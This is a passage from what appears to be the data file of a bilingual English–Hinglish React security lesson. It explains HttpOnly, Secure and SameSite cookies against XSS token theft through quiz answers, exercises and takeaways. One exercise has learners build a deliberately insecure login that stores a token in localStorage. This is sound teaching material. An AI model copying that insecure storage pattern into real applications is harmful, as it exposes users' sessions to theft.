        aHi: '\`HttpOnly\` cookie khud par ek browser-lagu-ki-gayi restriction hai, JavaScript se poori tarah neeche ek star par lagu ki jaati hai: jab ek cookie ye attribute le kar chalti hai, browser bas ise kabhi \`document.cookie\` jo bhi lautaata hai usmein shaamil nahi karta, aur koi doosri JavaScript-access-laayak API bhi ise expose nahi karti, maang karti script ke paas jo bhi privileges hon un se bekhabar. Iska matlab hai ek XSS payload, chahe wo bilkul page ke apne vaidh code jaisi effective privileges ke saath chal rahi ho, uske paas koi API upalabdh nahi hai jo kabhi is khaas cookie ki value lautaaye — padhne ke liye kuch hai hi nahi, is liye nahi ki script ke paas kisi check-hone-laayak maayne mein permission nahi hai, balki isliye kyunki browser khud kabhi is value ko kisi bhi JavaScript context tak ujaagar hi nahi karta. \`HttpOnly\` jiske khilaaf SURAKSHIT NAHI KARTA wo hai usi underlying XSS vulnerability ka ek categorically alag natija: chahe cookie khud poori tarah na-padhne-laayak ho, ek malicious script phir bhi victim ke browser se HTTP requests bana sakti hai, aur browser phir bhi automatically wahi \`HttpOnly\` cookie us kisi bhi request se jodega jo script mutaalliq domain tak shuru karti hai, bilkul jaise ye ek request ke liye karta jo vaidh page code ne shuru ki ho. Iska matlab hai attacker ki script token ko baad mein kahin aur se dobara istemal karne ke liye chura nahi sakti, par ye phir bhi victim ke apne browser ko attacker ki taraf se abhi authenticated requests banwaane ka kaaran ban sakti hai, jabki malicious script chal rahi hai — actions jaise ek email address badalna, funds transfer karna, ya content post karna, sab cookie ke saath poore kiye gaye jise browser automatically saath bhejta hai, attacker ki script ko kabhi cookie ki asli value jaanne ya padhne ki zaroorat bina. Ye doosra natija ek cross-site request forgery chinta hai, \`SameSite\` aur doosre CSRF-khaas defenses dwara sambodhit, \`HttpOnly\` dwara nahi.',
      },
      {
        q: 'What genuine tradeoff does a React application take on by switching from a localStorage-stored token to an HttpOnly cookie, and why is it usually worth accepting?',
        qHi: '\`localStorage\`-store-hue token se ek \`HttpOnly\` cookie mein badalne se ek React application kya asli tradeoff uthaata hai, aur ye aam taur par sweekaarne ke laayak kyun hai?',
        a: 'A token stored in localStorage, while insecure, offers one genuine convenience: the frontend can read it directly and synchronously at any time, including decoding a JWT\'s payload (even without cryptographically verifying it, which requires the signing secret the frontend never has) to check something like an expiration timestamp, without needing to make any network request at all. Once the token moves into an HttpOnly cookie, the frontend loses this direct access entirely and by design — there is no JavaScript-accessible way to read the cookie\'s value or inspect its contents, which means determining whether a user is currently authenticated, or reading any information that used to be decoded from the token client-side, now requires an actual network round-trip to a server endpoint (commonly something like /api/me) that can read the cookie server-side and respond accordingly. This tradeoff is virtually always worth accepting because the specific thing being given up — synchronous, no-network-required access to the token\'s raw contents — is a minor convenience, typically only meaningfully felt in situations like an app\'s very first render needing to decide whether to show a logged-in or logged-out view, which can be handled with a brief loading state while the one auth-check request completes. What is being gained in exchange is qualitatively different in severity: the elimination of the single most damaging consequence a successful XSS attack can have on session security, full, reusable credential theft. A brief loading state or one extra network request most users will never consciously notice is a small, one-time cost for closing a vulnerability that could otherwise compromise every single user\'s account simultaneously.',
        aHi: '\`localStorage\` mein store hua ek token, asurakshit hote hue bhi, ek asli suvidha deta hai: frontend ise seedhe aur synchronously kisi bhi waqt padh sakta hai, ek JWT ke payload ko decode karna sameet (chahe cryptographically verify kiye bina, jise signing secret chahiye jo frontend ke paas kabhi nahi hota) kisi cheez jaise expiration timestamp check karne ke liye, koi network request bilkul kiye bina. Ek baar token ek \`HttpOnly\` cookie mein chala jaata hai, frontend ye seedhi access poori tarah aur design se kho deta hai — cookie ki value padhne ya iski contents inspect karne ka koi JavaScript-access-laayak tarika nahi hai, matlab kya ek user abhi authenticated hai ye tay karna, ya token se client-side decode ki jaati thi wo koi bhi jaankaari padhna, ab ek server endpoint (aam taur par kuch \`/api/me\` jaisa) tak ek asli network round-trip maangta hai jo cookie ko server-side padh sakta hai aur us hisaab se jawaab de sakta hai. Ye tradeoff lagbhag hamesha sweekaarne ke laayak hai kyunki jo khaas cheez chhodi jaa rahi hai — token ki raw contents tak synchronous, network-bina access — ek chhoti suvidha hai, aam taur par sirf un sthitiyon mein maayne-rakhta mehsoos hoti hai jaise ek app ki bilkul pehli render ko faisla karna hai logged-in ya logged-out view dikhaana hai, jise ek chhoti loading state ke saath handle kiya jaa sakta hai jabki ek auth-check request poori hoti hai. Iske badle mein jo mila raha hai wo gambhirta mein qualitatively alag hai: ek safal XSS attack ka sabse zyaada nuksaandaayak natija ka khaatma jo session security par ho sakta hai, poori, dobara-istemal-hone-laayak credential churi. Ek chhoti loading state ya ek extra network request jise zyaadatar users kabhi hosh se notice nahi karenge ek vulnerability band karne ke liye ek chhoti, ek-baar ki keemat hai jo warna har akele user ka account ek saath compromise kar sakti thi.',
      },
    ],

    exercises: [
      {
        task: 'Build the broken login flow storing a mock token in localStorage. Open the browser console, run localStorage.getItem("token"), and confirm the token is fully readable and copyable.',
        taskHi: 'Ek mock token ko \`localStorage\` mein store karta toota login flow banao. Browser console kholo, \`localStorage.getItem("token")\` chalaao, aur confirm karo ki token poori tarah padhne aur copy karne laayak hai.',
        hint: 'This exercise is meant to make the risk tangible — try pasting the token into a different tab\'s console to confirm it works exactly the same way there too.',
        hintHi: 'Ye exercise khatre ko chhuwa jaa sakta banaane ke liye hai — token ko ek alag tab ke console mein paste karke koshish karo confirm karne ke liye ki ye wahaan bhi bilkul wahi tarike se kaam karta hai.',
      },
      {
        task: 'Set up a minimal server endpoint that sets an HttpOnly cookie on login, and refactor the frontend to use credentials: "include" instead of localStorage. Confirm document.cookie in the console never shows the session cookie.',
        taskHi: 'Ek minimal server endpoint set up karo jo login par ek \`HttpOnly\` cookie set karta hai, aur frontend ko \`localStorage\` ke bajaye \`credentials: "include"\` istemal karne ke liye refactor karo. Confirm karo ki console mein \`document.cookie\` kabhi session cookie nahi dikhaata.',
        hint: 'If using Express on the backend, res.cookie("session", token, { httpOnly: true, secure: true, sameSite: "strict" }) is the equivalent of the Set-Cookie header shown in this lesson.',
        hintHi: 'Agar backend par Express istemal kar rahe ho, \`res.cookie("session", token, { httpOnly: true, secure: true, sameSite: "strict" })\` is lesson mein dikhaaye \`Set-Cookie\` header ke barabar hai.',
      },
      {
        task: 'Build the useAuthStatus hook from this lesson\'s third example, backed by a real /api/me endpoint. Confirm it correctly reports logged-out before login and logged-in after, using only the automatically-attached cookie.',
        taskHi: 'Is lesson ke teesre example ka \`useAuthStatus\` hook banao, ek asli \`/api/me\` endpoint se backed. Confirm karo ki ye login se pehle logged-out aur baad mein logged-in sahi tarike se report karta hai, sirf automatically-attached cookie istemal karte hue.',
        hint: 'Test by manually clearing cookies in the browser\'s dev tools and confirming the hook correctly reports logged-out afterward, without any code change.',
        hintHi: 'Browser ke dev tools mein manually cookies clear karke test karo aur confirm karo ki hook baad mein bina kisi code badlaav ke sahi tarike se logged-out report karta hai.',
      },
    ],

    keyTakeaways: [
      'A token stored in localStorage is readable by any JavaScript running on the page — including a successful XSS payload — turning any single XSS vulnerability anywhere in the app into a full session compromise.',
      'HttpOnly is a browser-enforced restriction, not a convention: a cookie marked HttpOnly is simply never included in document.cookie or any other JavaScript-accessible API, regardless of that script\'s privileges.',
      'Secure ensures a cookie is only ever sent over HTTPS, and SameSite controls whether it\'s attached to cross-site requests, forming the primary defense against CSRF, covered in the next lesson.',
      'Switching to an HttpOnly cookie means the frontend can no longer read the token\'s contents directly — checking auth status requires a small network request (e.g. to /api/me) instead of a synchronous local read.',
      'HttpOnly cookies are defense-in-depth, not a substitute for sanitizing user content — a successful XSS payload can still make authenticated requests via the automatically-attached cookie, even without ever reading its value.',
      'This is a browser-platform feature, not a React-specific technique — the same HttpOnly, Secure, and SameSite protections apply identically regardless of which frontend framework a cookie-authenticated application uses.',
    ],
    keyTakeawaysHi: [
      '\`localStorage\` mein store hua ek token page par chalti kisi bhi JavaScript ke liye padhne-laayak hai — ek safal XSS payload sameet — app mein kahin bhi ek akeli XSS vulnerability ko ek poore session compromise mein badalte hue.',
      '\`HttpOnly\` ek browser-lagu-ki-gayi restriction hai, ek convention nahi: \`HttpOnly\` maark ki gayi ek cookie bas kabhi \`document.cookie\` ya kisi doosri JavaScript-access-laayak API mein shaamil nahi hoti, us script ke privileges se bekhabar.',
      '\`Secure\` sunishchit karta hai ki ek cookie sirf hamesha HTTPS par bheji jaaye, aur \`SameSite\` niyantrit karta hai ki kya ye cross-site requests se jodi jaati hai, CSRF ke khilaaf mukhya defense banaate hue, agle lesson mein cover kiya gaya.',
      'Ek \`HttpOnly\` cookie mein switch karna matlab hai frontend ab token ki contents seedhe nahi padh sakta — auth status check karna ek chhoti network request maangta hai (jaise \`/api/me\`) ek synchronous local read ke bajaye.',
      '\`HttpOnly\` cookies defense-in-depth hain, user content sanitize karne ka replacement nahi — ek safal XSS payload phir bhi automatically-attached cookie ke zariye authenticated requests bana sakti hai, uski value kabhi padhe bina.',
      'Ye ek browser-platform feature hai, koi React-khaas technique nahi — wahi \`HttpOnly\`, \`Secure\`, aur \`SameSite\` protections identical roop se lagu hoti hain chahe ek cookie-authenticated application koi bhi frontend framework istemal kare.',
    ],
  },
];
